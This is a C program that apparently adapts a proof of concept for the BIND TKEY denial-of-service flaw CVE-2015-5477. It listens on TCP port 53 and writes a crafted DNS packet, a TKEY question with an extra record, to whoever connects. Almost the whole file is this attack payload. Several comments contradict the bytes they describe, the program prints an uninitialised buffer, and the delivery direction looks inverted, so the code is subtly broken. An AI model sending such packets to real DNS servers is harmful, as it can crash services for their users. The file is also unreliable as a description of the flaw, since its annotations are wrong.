#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <errno.h>
#define WSAGetLastError() (errno)
#define WSA(err) (err)
#define closesocket(fd) close(fd)

#define MAX_CONNECTS 5
#define PORT 53

/*
 * Packet for querying the version of the server, to test if it's up
 */
static const unsigned char versionpacket[] = {
        0x03, 0x04, /* ID */
        0x81, 0x80, /* FLAG 00000001, 00000000 */
        0x00, 0x01, /* QDCOUNT 1 One Question */
        0x00, 0x00, /* ANCOUNT 1 by Client */
        0x00, 0x00, /* NSCOUNT 0 by Client */
        0x00, 0x01, /* ARCOUNT 0 by Client */

        /* QUESTION SECTION */
        0x03, '1', 'm', 'g', 0x03, 'o', 'r', 'g', 0x00, /* QNAME */
        0x00, 249, /* QTYPE = 259(TKEY RR) */
        0x00, 255, /* QCLASS = 255(ANY) */

        /* Additional record  */
        0x03, '1', 'm', 'g', 0x03, 'o', 'r', 'g', 0x00, /* QNAME */
        0x00, 249, /* record type: must NOT be 249/TKEY */
        0x00, 254,
        0x00, 0x00, 0x00, 0x30,
        0x00, 51,
            50,
            'h', 't', 't', 'p', 's', ':', '/', '/', 
            'g', 'i', 't', 'h', 'u', 'b', '.', 'c', 
            'o', 'm', '/', 'r', 'o', 'b', 'e', 'r', 
            't', 'd', 'a', 'v', 'i', 'd', 'g', 'r', 
            'a', 'h', 'a', 'm', '/', 'c', 'v', 'e', 
            '-', '2', '0', '1', '5', '-', '5', '4', 
            '7', '7'
};

int main() {
  int server_sock, client_sock, server_len, client_len;
  struct sockaddr_in server_addr;
  struct sockaddr_in client_addr;
  char buf[10];

  server_sock = socket(AF_INET, SOCK_STREAM, 0);

  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = htons(INADDR_ANY);
  server_addr.sin_port = htons(PORT);

  server_len = sizeof(server_addr);
  bind(server_sock, (struct sockaddr *)&server_addr, server_len);

  listen(server_sock , MAX_CONNECTS);

  while(1) {
    client_len = sizeof(client_addr);
    if ((client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_len)) < 0) {
      perror("Error client_sock");
      exit(1);
    }
    close(server_sock);
    break;
  }
  write(client_sock, (const char*)versionpacket, sizeof(versionpacket));
  printf("Read %s\n", buf);
  close(client_sock);
}
